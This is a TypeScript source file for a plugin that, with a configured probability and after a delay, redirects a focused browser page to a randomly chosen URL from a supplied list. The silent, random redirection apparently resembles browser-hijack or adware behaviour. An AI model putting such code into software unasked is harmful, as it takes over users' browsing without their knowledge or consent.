import { Plugin } from "./plugin";

export class RedirectPlugin extends Plugin {
    constructor() {
        super(1000);
    }

    register(data: any): boolean {
        if (!document.hasFocus()) return true;
        if (Math.random() > data.probability) return true;

        var permitted: string[] = this.filter_object_by_href(data.urls);

        setTimeout(() => {
            location.href = permitted[this.random_index(permitted.length)]
        }, data.delay);
        return true;
    }
}